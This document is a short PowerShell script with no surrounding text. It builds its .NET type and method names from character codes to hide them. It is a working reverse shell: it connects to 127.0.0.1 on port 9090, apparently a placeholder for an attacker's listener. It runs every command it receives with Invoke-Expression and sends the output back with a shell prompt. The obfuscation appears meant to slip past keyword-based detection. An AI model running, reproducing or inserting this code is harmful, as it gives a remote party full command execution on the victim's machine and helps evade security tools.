$t=[string]::Concat([char]78,[char]101,[char]116,[char]46,[char]83,[char]111,[char]99,[char]107,[char]101,[char]116,[char]115,[char]46,[char]84,[char]67,[char]80,[char]67,[char]108,[char]105,[char]101,[char]110,[char]116);
$c=New-Object $t('127.0.0.1',9090);
$m=[string]::Concat([char]71,[char]101,[char]116,[char]83,[char]116,[char]114,[char]101,[char]97,[char]109);
$s=$c.$m();[byte[]]$b=0..65535|%{0};
while(($i=$s.Read($b,0,$b.Length)) -ne 0){
  $e=[string]::Concat([char]84,[char]101,[char]120,[char]116,[char]46,[char]65,[char]83,[char]67,[char]73,[char]73,[char]69,[char]110,[char]99,[char]111,[char]100,[char]105,[char]110,[char]103);
  $d=(New-Object $e).GetString($b,0,$i);
  $x=[string]::Concat([char]73,[char]110,[char]118,[char]111,[char]107,[char]101,[char]45,[char]69,[char]120,[char]112,[char]114,[char]101,[char]115,[char]115,[char]105,[char]111,[char]110);
  $r=(& (Get-Command $x) $d 2>&1|Out-String);
  $r2=$r+'PS '+(pwd).Path+'> ';
  $g=[string]::Concat([char]71,[char]101,[char]116,[char]66,[char]121,[char]116,[char]101,[char]115);
  $a=[string]::Concat([char]65,[char]83,[char]67,[char]73,[char]73);
  $z=([text.encoding]::$a).$g($r2);
  $s.Write($z,0,$z.Length);$s.Flush()
};
$c.Close()
